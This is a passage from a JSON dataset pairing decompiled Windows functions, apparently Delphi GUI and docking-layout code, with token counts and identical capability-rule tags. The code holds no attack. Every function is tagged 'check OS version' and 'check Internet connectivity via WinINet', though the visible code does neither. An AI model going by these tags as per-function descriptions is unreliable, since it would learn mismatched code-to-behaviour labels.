var_ch;\n            }\n            if (0 < *var_8h) {\n                *var_8h = *var_8h - var_10h;\n            }\n            if (0 < *arg_ch) {\n                *arg_ch = *arg_ch - var_14h;\n            }\n            if (0 < *arg_8h) {\n                *arg_8h = *arg_8h - var_18h;\n            }\n            arg_8h_00 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff80;\n            var_20h = 0;\n            var_30h = 0;\n            var_24h = 0;\n            var_34h = 0;\n            var_28h = 0;\n            var_38h = 0;\n            var_2ch = 0;\n            var_3ch = 0;\n            iVar3 = fcn.00453b18();\n            if (-1 < iVar3 + -1) {\n                var_1ch = 0;\n                do {\n                    iVar4 = fcn.00453adc();\n                    if ((*(iVar4 + 0x57) != '\\0') || (((*(iVar4 + 0x1c) & 0x10) != 0 && ((*(iVar4 + 0x51) & 4) == 0))))\n                    {\n                        arg_8h_00 = &var_4ch;\n                        fcn.00458020(arg_8h_00, &var_44h);\n                        cVar1 = *(iVar4 + 0x5b);\n                        if (cVar1 == '\\0') {\n                            if (*0x458568 == (*(iVar4 + 0x61) & *0x458568)) {\n                                var_4dh = '\\x01';\n                                if (0 < var_40h) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_40h = ((var_56h - lprc) - iVar5) - var_40h;\n                                }\n                                if (0 < var_44h) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_44h = ((var_56h - lprc) + var_44h) - iVar5;\n                                }\n                            }\n                            else {\n                                var_4dh = '\\0';\n                            }\n                        }\n                        else if (cVar1 - 1U < 2) {\n                            var_4dh = '\\x01';\n                        }\n                        else if (cVar1 == '\\x05') {\n                            var_4dh = '\\x02';\n                        }\n                        else {\n                            var_4dh = '\\x03';\n                        }\n                        if (*(iVar4 + 0x5b) == '\\0') {\n                            if (*0x45856c == (*(iVar4 + 0x61) & *0x45856c)) {\n                                var_4eh = '\\x01';\n                                if (0 < var_48h) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_48h = ((var_52h - var_5ah) - iVar5) - var_48h;\n                                }\n                                if (0 < var_4ch) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_4ch = ((var_52h - var_5ah) + var_4ch) - iVar5;\n                                }\n                            }\n                            else {\n                                var_4eh = '\\0';\n                            }\n                        }\n                        else {\n                            uVar2 = *(iVar4 + 0x5b) - 3;\n                            if (uVar2 < 2) {\n                                var_4eh = '\\x01';\n                            }\n                            else if (uVar2 == 2) {\n                                var_4eh = '\\x02';\n                            }\n                            else {\n                                var_4eh = '\\x03';\n                            }\n                        }\n                        if (var_4dh - 1U < 2) {\n                            if (((0 < var_40h) && (*var_4h < var_40h)) && (*var_4h = var_40h,  var_20h < *var_4h)) {\n                                var_20h = *var_4h;\n                            }\n                            if (((0 < var_44h) && (var_44h < *arg_ch)) && (*arg_ch = var_44h,  var_24h < *arg_ch)) {\n                                var_24h = *arg_ch;\n                            }\n                        }\n                        else if (var_4dh == '\\x03') {\n                            iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_30h = var_30h + iVar5;\n                            iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_34h = var_34h + iVar5;\n                        }\n                        if (var_4eh - 1U < 2) {\n                            if (((0 < var_48h) && (*var_8h < var_48h)) && (*var_8h = var_48h,  var_28h < *var_8h)) {\n                                var_28h = *var_8h;\n                            }\n                            if (((0 < var_4ch) && (var_4ch < *arg_8h)) && (*arg_8h = var_4ch,  var_2ch < *arg_8h)) {\n                                var_2ch = *arg_8h;\n                            }\n                        }\n                        else if (var_4eh - 1U == 2) {\n                            iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_38h = var_38h + iVar5;\n                            iVar4 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_3ch = var_3ch + iVar4;\n                        }\n                    }\n                    var_1ch = var_1ch + 1;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            if ((0 < var_20h) && (*var_4h < var_20h + var_30h)) {\n                *var_4h = var_20h + var_30h;\n            }\n            if ((0 < var_24h) && ((*arg_ch == 0 || (*arg_ch < var_24h + var_34h)))) {\n                *arg_ch = var_24h + var_34h;\n            }\n            if ((0 < var_28h) && (*var_8h < var_28h + var_38h)) {\n                *var_8h = var_28h + var_38h;\n            }\n            if ((0 < var_2ch) && ((*arg_8h == 0 || (*arg_8h < var_2ch + var_3ch)))) {\n                *arg_8h = var_2ch + var_3ch;\n            }\n            *in_FS_OFFSET = arg_8h_00;\n            if (0 < *var_4h) {\n                *var_4h = *var_4h + var_ch;\n            }\n            if (0 < *var_8h) {\n                *var_8h = *var_8h + var_10h;\n            }\n            if (0 < *arg_ch) {\n                *arg_ch = *arg_ch + var_14h;\n            }\n            if (0 < *arg_8h) {\n                *arg_8h = *arg_8h + var_18h;\n            }\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 2341
    },
    "00458624": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00458624(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_24h;\n    uint var_20h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack72 = 0x458642;\n    cVar1 = fcn.00457d34();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x5b) != '\\x05')) {\n        if ((*(in_EAX + 7) & 0x10) != 0) {\n            puStack72 = 0x458668;\n            iVar2 = fcn.00453b18();\n            if (iVar2 < 1) {\n                return 1;\n            }\n        }\n        puStack72 = 0x45867e;\n        (**(*in_EAX + 0xc0))();\n        puStack72 = 0x458689;\n        (**(*in_EAX + 0x44))();\n        puStack72 = 0x458697;\n        (**(*in_EAX + 0x90))();\n        puStack72 = 0x45869f;\n        fcn.00453634();\n        uStack76 = 0x458752;\n        uStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack72 = &stack0xfffffffc;\n        iVar2 = fcn.00453b18();\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar3 = fcn.00453adc();\n                if ((*(piVar3 + 0x57) != '\\0') || (((*(piVar3 + 7) & 0x10) != 0 && ((*(piVar3 + 0x51) & 4) == 0)))) {\n                    (**(*piVar3 + 0x88))(piVar3[0x13], piVar3[0x12]);\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *in_FS_OFFSET = uStack80;\n        puStack72 = 0x458759;\n        *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xffef;\n        uStack76 = 0x458751;\n        uVar4 = fcn.0045363c();\n        return uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 618
    },
    "00458d1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458d1c(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x30);\n    while ((iVar2 = iVar1,  *(in_EAX + 0x94) == 0 && (iVar2 != 0))) {\n        in_EAX = iVar2;\n        iVar1 = *(iVar2 + 0x30);\n    }\n    if (in_EAX != 0) {\n        fcn.0044f860(param_2 & 0x7f);\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "00458e90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00458e90(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x458ea4;\n    cVar2 = fcn.00457d34();\n    if ((cVar2 == '\\0') || ((*(in_EAX + 0x55) & 0x20) != 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        puStack20 = 0x458eca;\n        fcn.00458dc8();\n    }\n    uStack24 = 0x458f00;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.0044fb98();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x458f07;\n    if (bVar1) {\n        uStack24 = 0x458eff;\n        fcn.00458dc8();\n    }\n    return;\n}\n",
        "token_count": 286
    },
    "00459160": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00459160(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x4591eb;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.00458d04();\n    if (*(in_EAX + 600) == '\\0') {\n        fcn.0044fcc4();\n        fcn.00424d1c();\n        fcn.0044f3bc();\n        fcn.0044fcc4();\n        fcn.00424d38();\n        fcn.0044f3f0();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4591f2;\n    uStack24 = 0x4591ea;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 237
    },
    "0045958c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045958c(uint param_1, int16_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((param_2 != *(in_EAX + 0x68)) && (*(in_EAX + 0x68) = param_2,  *(in_EAX + 0x6a) != '\\0')) {\n        fcn.004436c0();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "004595b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004595b0(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint var_4h;\n    \n    uVar2 = 0;\n    cVar1 = fcn.00447a64();\n    if (cVar1 != '\\0') {\n        if (*(in_EAX + 0x6a) == '\\0') {\n            fcn.00459544(*(in_EAX + 0x74));\n        }\n        uVar2 = fcn.00459624(arg_8h);\n        if (uVar2 != '\\0') {\n            *(in_EAX + 0x7c) = *(**0x492ad4 + 0x44);\n            fcn.004436c0();\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 188
    },
    "00459688": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00459688(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    cVar1 = fcn.00447a64();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x6c) != 0)) {\n        sub.comctl32.dll_ImageList_DragLeave(*(in_EAX + 0x6c));\n        *(in_EAX + 0x6c) = 0;\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "00459720": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.00459720(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    bool bVar3;\n    \n    cVar1 = fcn.00447a64();\n    if ((cVar1 == '\\0') || (*(in_EAX + 0x6a) == '\\0')) {\n        bVar3 = false;\n    }\n    else {\n        fcn.00459688();\n        iVar2 = sub.comctl32.dll_ImageList_EndDrag();\n        bVar3 = iVar2 != 0;\n        *(in_EAX + 0x6a) = 0;\n        fcn.0045958c();\n        fcn.004436c0();\n    }\n    return bVar3;\n}\n",
        "token_count": 167
    },
    "00459770": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00459770(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00452964();\n    uVar1 = fcn.0042497c();\n    *(in_EAX + 0x250) = uVar1;\n    fcn.0044e570();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 198
    },
    "004598e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.004598e8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x14) == 0) || (*(*(in_EAX + 0x14) + 0x10) == '\\0')) &&\n       ((in_EAX != *(*(in_EAX + 0x1c) + 100) || (*(in_EAX + 0x10) == '\\0')))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 113
    },
    "00459a30": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00459a30(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint uStack32;\n    uint uStack28;\n    \n    iVar1 = in_EAX;\n    while (iVar3 = iVar1,  iVar3 != *(*(in_EAX + 0x1c) + 100)) {\n        iVar1 = *(iVar3 + 0x14);\n        if ((param_2 == *(iVar1 + 0x10)) && (*(iVar3 + 0x18) != 0)) {\n            uVar2 = fcn.00459e88();\n            return uVar2;\n        }\n    }\n    (**(**(*(in_EAX + 0x1c) + 0x14) + 0x44))();\n    (**(**(*(in_EAX + 0x1c) + 0x14) + 0x90))();\n    if (param_2 == '\\x01') {\n        return uStack28;\n    }\n    if (param_2 == '\\x02') {\n        return uStack32;\n    }\n    return 0;\n}\n",
        "token_count": 268
    },
    "00459ab4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00459ab4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iStack32;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    if ((in_EAX == *(*(in_EAX + 0x1c) + 100)) ||\n       (((iVar2 = in_EAX,  *(*(in_EAX + 0x1c) + 100) == *(in_EAX + 0x14) && (*(in_EAX + 4) != 0)) &&\n        (iVar1 = fcn.00459944(),  iVar1 == 1)))) {\n        (**(**(*(in_EAX + 0x1c) + 0x14) + 0x44))();\n        (**(**(*(in_EAX + 0x1c) + 0x14) + 0x90))();\n        if (param_2 == '\\x01') {\n            iVar2 = iStack20 - iStack28;\n        }\n        else {\n            iVar2 = iStack24 - iStack32;\n        }\n    }\n    else {\n        for (; iVar2 != *(*(in_EAX + 0x1c) + 100); iVar2 = *(iVar2 + 0x14)) {\n            if (param_2 == *(*(iVar2 + 0x14) + 0x10)) {\n                iVar2 = fcn.00459e88();\n                iVar1 = fcn.004599a0();\n                return iVar2 - iVar1;\n            }\n        }\n        if (param_2 == *(*(*(in_EAX + 0x1c) + 100) + 0x10)) {\n            iVar2 = *(*(in_EAX + 0x1c) + 0x68);\n        }\n        else {\n            iVar2 = fcn.00459e88();\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 450
    },
    "00459b6c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00459b6c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00459944();\n    if ((iVar1 != 0) && (*(in_EAX + 0x10) != '\\0')) {\n        iVar2 = fcn.00459f8c();\n        if (*(in_EAX + 0x10) == '\\x01') {\n            iVar1 = fcn.00459ab4();\n        }\n        else if (*(in_EAX + 0x10) == '\\x02') {\n            iVar1 = fcn.00459ab4();\n        }\n        else {\n            iVar1 = 0;\n        }\n        iVar3 = fcn.00459944();\n        iVar1 = iVar1 / iVar3;\n        while (iVar2 != 0) {\n            if (*(iVar2 + 0xc) == 0) {\n                fcn.00459eb0();\n            }\n            else {\n                fcn.004599a0();\n                fcn.00459eb0();\n            }\n            fcn.00459d0c();\n            iVar1 = fcn.00459f64();\n            iVar2 = iVar1;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 290
    },
    "00459c14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00459c14(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0040546c();\n    if (*(in_EAX + 4) != 0) {\n        if (*(*(in_EAX + 4) + 8) == 0) {\n            fcn.0040db2c();\n            fcn.00404eb4();\n        }\n        fcn.004054c0();\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "00459c58": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x00459c8d)\n\nuint fcn.00459c58(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.0040483c();\n    return 0;\n}\n",
        "token_count": 80
    },
    "00459d0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00459d0c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *arg_8h;\n    uint var_14h;\n    int32_t var_4h;\n    \n    iVar2 = *(in_EAX + 4);\n    if (iVar2 == 0) {\n        return;\n    }\n    if (*(iVar2 + 0x57) == '\\0') {\n        return;\n    }\n    if (*(*(in_EAX + 0x1c) + 0x6c) != 0) {\n        return;\n    }\n    *(iVar2 + 0x90) = *(*(in_EAX + 0x14) + 0x10);\n    var_4h = in_EAX;\n    fcn.00459ab4();\n    iVar2 = fcn.00459ab4();\n    cVar1 = fcn.00459cdc(&stack0xfffffffc);\n    if ((cVar1 != '\\0') && (*(*(var_4h + 0x14) + 0x10) != '\\x01')) {\n        iVar2 = iVar2 - *(*(var_4h + 0x1c) + 0xc);\n    }\n    iVar3 = fcn.00459f64();\n    if ((iVar3 == 0) &&\n       (((*(var_4h + 0x14) == *(*(var_4h + 0x1c) + 100) ||\n         (*(*(var_4h + 0x14) + 0x10) != *(*(*(var_4h + 0x1c) + 100) + 0x10))) ||\n        (iVar3 = fcn.00459e88(),  *(*(var_4h + 0x1c) + 0x68) <= iVar3)))) {\n        if (*(*(var_4h + 0x14) + 0x10) == *(*(*(var_4h + 0x1c) + 100) + 0x10)) goto code_r0x00459e35;\n        iVar3 = fcn.00459e88();\n        iVar4 = fcn.00459e88();\n        if (iVar4 <= iVar3) goto code_r0x00459e35;\n    }\n    if (*(*(var_4h + 0x14) + 0x10) == '\\x01') {\n        iVar2 = iVar2 - *(*(var_4h + 0x1c) + 0xc);\n    }\ncode_r0x00459e35:\n    arg_8h = &var_14h;\n    uVar5 = fcn.00459a30();\n    fcn.00459a30(uVar5);\n    fcn.004183b0(arg_8h, iVar2);\n    (****(var_4h + 0x1c))();\n    fcn.0044f604();\n    return;\n}\n",
        "token_count": 675
    },
    "0045a184": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045a184(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(arg_8h + -4) == *(in_EAX + 4)) {\n        *(arg_8h + -8) = in_EAX;\n        return;\n    }\n    if ((*(arg_8h + -8) == 0) && (*(in_EAX + 0xc) != 0)) {\n        fcn.0045a184(arg_8h);\n    }\n    if ((*(arg_8h + -8) == 0) && (*(in_EAX + 8) != 0)) {\n        fcn.0045a184(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "0045a1dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045a1dc(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((param_2 != 0) && (*(in_EAX + 100) != 0)) {\n        fcn.0045a184(&stack0xfffffffc);\n    }\n    return 0;\n}\n",
        "token_count": 94
    },
    "0045a2e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0045a2e0(uint arg_8h)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint8_t in_CL;\n    uint8_t uVar4;\n    int32_t in_EDX;\n    int32_t var_30h;\n    int32_t iStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint8_t var_9h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if (*(in_EDX + 0x57) != '\\0') {\n        var_1h._0_1_ = in_CL;\n        if (in_EAX[0xe] == 0) {\n            if (*(in_EAX[0x19] + 8) == 0) {\n                (**(*in_EAX[5] + 0x44))();\n                (**(*in_EAX[5] + 0x90))();\n                var_10h = var_14h - var_1ch;\n                if (*(in_EAX[5] + 0x5c) != '\\0') {\n                    if (var_18h == var_20h) {\n                        fcn.0044fc64();\n                    }\n                    if (var_10h == 0) {\n                        var_10h = fcn.0044fc50();\n                    }\n                }\n                fcn.004183b0(&var_30h, var_10h);\n                var_20h = var_30h;\n                var_1ch = iStack48;\n                var_18h = iStack44;\n                var_14h = iStack40;\n                (***in_EAX)();\n                fcn.0044f604();\n                iVar1 = fcn.0045990c();\n                iVar2 = in_EAX[0x19];\n                *(iVar2 + 8) = iVar1;\n                *(iVar1 + 0x14) = iVar2;\n                *(iVar1 + 4) = in_EDX;\n            }\n            else {\n                if ((in_CL == 0) || (in_CL == 5)) {\n                    var_1h._0_1_ = 4;\n                }\n                iVar2 = fcn.0045a1dc();\n                if (iVar2 != 0) {\n                    fcn.0045b430();\n                }\n                var_8h = fcn.0045a1dc();\n                var_9h = *(var_1h + 0x491744);\n                iVar2 = fcn.00459930();\n                if (iVar2 == 1) {\n                    *(in_EAX[0x19] + 0x10) = var_9h;\n                    if (var_9h == 1) {\n                        fcn.00459ab4();\n                        fcn.00459eb0();\n                        uVar3 = fcn.00459ab4();\n                        in_EAX[0x1a] = uVar3;\n                    }\n                    else if (var_9h == 2) {\n                        fcn.00459ab4();\n                        fcn.00459eb0();\n                        uVar3 = fcn.00459ab4();\n                        in_EAX[0x1a] = uVar3;\n                    }\n                }\n                iVar2 = fcn.0045990c();\n                *(iVar2 + 4) = in_EDX;\n                if (var_8h == 0) {\n                    uVar4 = *(in_EAX[0x19] + 0x10);\n                }\n                else {\n                    uVar4 = *(*(var_8h + 0x14) + 0x10);\n                }\n                if (var_9h == 0) {\n                    var_9h = uVar4;\n                }\n                if (uVar4 == var_9h) {\n                    fcn.0045a6a4(*(var_1h + 0x49174c));\n                }\n                else {\n                    fcn.0045a4fc(*(var_1h + 0x49174c), var_9h);\n                }\n            }\n        }\n        else {\n            *(in_EAX[0xe] + 4) = in_EDX;\n            fcn.00459d0c();\n        }\n        (**(*in_EAX[5] + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 1041
    },
    "0045a4fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045a4fc(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    iVar2 = fcn.0045990c();\n    *(iVar2 + 0x10) = arg_ch;\n    if (in_ECX == 0) {\n        fcn.00459eb0();\n        uVar3 = fcn.00459e88();\n        *(in_EAX + 0x68) = uVar3;\n        *(in_EAX + 0x48) = arg_ch;\n        *(in_EAX + 0x40) = 0;\n        *(in_EAX + 0x44) = 0x3fe00000;\n        if (arg_8h == '\\0') {\n            *(iVar2 + 8) = in_EDX;\n            iVar1 = *(in_EAX + 100);\n            *(iVar1 + 0x14) = iVar2;\n            *(iVar1 + 0x18) = in_EDX;\n            *(in_EDX + 0xc) = iVar1;\n            *(in_EDX + 0x14) = iVar2;\n            *(in_EAX + 100) = iVar2;\n            fcn.0045a244(0x45b7b8);\n            uVar4 = fcn.00459e88();\n            iVar2 = uVar4 >> 1;\n            if (iVar2 < 0) {\n                iVar2 = iVar2 + ((uVar4 & 1) != 0);\n            }\n            *(in_EAX + 0x4c) = iVar2;\n            fcn.0045a244(0x45bc08);\n            fcn.00459e88();\n            fcn.00459eb0();\n        }\n        else {\n            *(iVar2 + 8) = *(in_EAX + 100);\n            iVar1 = *(in_EAX + 100);\n            *(iVar1 + 0x14) = iVar2;\n            *(iVar1 + 0xc) = in_EDX;\n            *(in_EDX + 0x18) = iVar1;\n            *(in_EDX + 0x14) = iVar2;\n            *(in_EAX + 100) = iVar2;\n            fcn.0045a244(0x45b7b8);\n        }\n        fcn.0045a244(0x45bd40);\n    }\n    else {\n        fcn.00459e88();\n        fcn.00459eb0();\n        *(iVar2 + 0x14) = *(in_ECX + 0x14);\n        iVar1 = *(in_ECX + 0x18);\n        *(iVar2 + 0x18) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0xc) = iVar2;\n        }\n        iVar1 = *(in_ECX + 0xc);\n        